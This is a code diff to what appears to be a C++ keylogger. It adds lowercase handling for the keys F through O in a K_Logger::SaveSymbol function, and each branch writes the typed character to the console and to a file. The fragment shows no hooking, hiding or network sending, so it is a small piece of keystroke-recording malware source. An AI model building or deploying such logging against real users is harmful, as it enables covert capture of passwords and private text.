@@ -216,6 +216,11 @@ int K_Logger::SaveSymbol(WORD iKey)
 				std::cout << "F";
 				WriteToFile("F");
 			}
+			else
+			{
+				std::cout << "f";
+				WriteToFile("f");
+			}
 			break;
 
 		case 71:
@@ -223,6 +228,11 @@ int K_Logger::SaveSymbol(WORD iKey)
 			{
 				std::cout << "G";
 				WriteToFile("G");
+			}
+			else
+			{
+				std::cout << "g";
+				WriteToFile("g");
 			}
 			break;
 
@@ -232,6 +242,11 @@ int K_Logger::SaveSymbol(WORD iKey)
 				std::cout << "H";
 				WriteToFile("H");
 			}
+			else
+			{
+				std::cout << "h";
+				WriteToFile("h");
+			}
 			break;
 
 		case 73:
@@ -240,6 +255,11 @@ int K_Logger::SaveSymbol(WORD iKey)
 				std::cout << "I";
 				WriteToFile("I");
 			}
+			else
+			{
+				std::cout << "i";
+				WriteToFile("i");
+			}
 			break;
 
 		case 74:
@@ -247,6 +267,11 @@ int K_Logger::SaveSymbol(WORD iKey)
 			{
 				std::cout << "J";
 				WriteToFile("J");
+			}
+			else
+			{
+				std::cout << "j";
+				WriteToFile("j");
 			}
 			break;
 
@@ -257,6 +282,11 @@ int K_Logger::SaveSymbol(WORD iKey)
 				std::cout << "K";
 				WriteToFile("K");
 			}
+			else
+			{
+				std::cout << "k";
+				WriteToFile("k");
+			}
 			break;
 
 
@@ -266,6 +296,11 @@ int K_Logger::SaveSymbol(WORD iKey)
 				std::cout << "L";
 				WriteToFile("L");
 			}
+			else
+			{
+				std::cout << "l";
+				WriteToFile("l");
+			}
 			break;
 
 		case 77:
@@ -273,6 +308,11 @@ int K_Logger::SaveSymbol(WORD iKey)
 			{
 				std::cout << "M";
 				WriteToFile("M");
+			}
+			else
+			{
+				std::cout << "m";
+				WriteToFile("m");
 			}
 			break;
 
@@ -283,6 +323,11 @@ int K_Logger::SaveSymbol(WORD iKey)
 				std::cout << "N";
 				WriteToFile("N");
 			}
+			else
+			{
+				std::cout << "n";
+				WriteToFile("n");
+			}
 			break;
 
 		case 79:
@@ -290,6 +335,11 @@ int K_Logger::SaveSymbol(WORD iKey)
 			{
 				std::cout << "O";
 				WriteToFile("O");
+			}
+			else
+			{
+				std::cout << "o";
+				WriteToFile("o");
 			}
 			break;
 
